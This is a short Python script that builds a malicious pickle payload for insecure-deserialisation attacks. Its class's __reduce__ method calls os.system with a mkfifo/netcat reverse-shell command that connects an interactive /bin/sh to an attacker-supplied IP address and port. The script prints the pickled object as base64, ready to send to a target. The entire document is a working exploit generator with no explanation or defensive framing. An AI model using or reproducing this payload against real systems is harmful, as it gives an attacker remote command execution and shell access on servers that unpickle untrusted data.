#! /usr/bin/env python3
import argparse
import pickle
import sys
import base64

def get_args():
    parser = argparse.ArgumentParser(prog="b64encode", description="encode commands to base64")
    parser.add_argument("-I", "--ipaddress", dest="ipaddress", help="select the attacker ip address to forward the shell to")
    parser.add_argument("-P", "--port", dest="port", help="select the port your ncat is listening on")
    return parser.parse_args()

values = get_args()


command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat ' + values.ipaddress +' '+ values.port + ' > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
